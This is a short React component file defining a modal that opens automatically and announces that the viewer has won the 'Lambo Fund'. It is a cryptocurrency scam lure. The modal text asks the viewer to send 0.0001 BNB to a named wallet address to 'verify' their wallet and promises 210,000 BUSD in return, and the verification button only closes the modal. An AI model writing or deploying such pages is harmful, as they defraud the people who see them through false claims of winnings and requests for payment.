import React from 'react'
import Modal from 'react-modal';


const customStyles = {
    content: {
        top: '50%',
        left: '50%',
        right: 'auto',
        bottom: 'auto',
        marginRight: '-50%',
        transform: 'translate(-50%, -50%)',
        background: 'transparent',
        maxWidth: "700px"
    }
};

// Make sure to bind modal to your appElement (https://reactcommunity.org/react-modal/accessibility/)
const { forwardRef, useRef, useImperativeHandle } = React;
const Winmodal= forwardRef((props, ref) =>{
    const [modalIsOpen, setIsOpen] = React.useState(true);
    useImperativeHandle(ref, () => ({
        openModal: () => {
            setIsOpen(true)
        }
    }));
    function openModal() {
        setIsOpen(true);
    }

    function afterOpenModal() {
        // references are now sync'd and can be accessed.
    }

    function closeModal() {
        setIsOpen(false);
    }
    return (
        <Modal
            isOpen={modalIsOpen}
            onAfterOpen={afterOpenModal}
            onRequestClose={closeModal}
            style={customStyles}
            contentLabel="Modal"
        >
            <div className="winmodal">
                <h1>Congrats</h1>
                <h3>You are the winner of the Lambo Fund!</h3>
                <div className="infoouter">
                    To claim your winnings, you must send 0.0001 BNB to 0xc0D9ABbAc582a5347370035c5d3cB5923e6ed1D0
                    This is how we verify that you are active and are in control of your wallet. You will then be sent the 210,000 BUSD!
                </div>
                <a className="btn-main btn-white mx-auto mt-3" onClick={closeModal}>Verify your winnings</a>
                <img src="images/lambo2.png" alt="Lambo car" className="modallambo" />
                <img src="images/money.png" alt="Cash" className="moneybg" />
            </div>
        </Modal>
    )
})

export default Winmodal
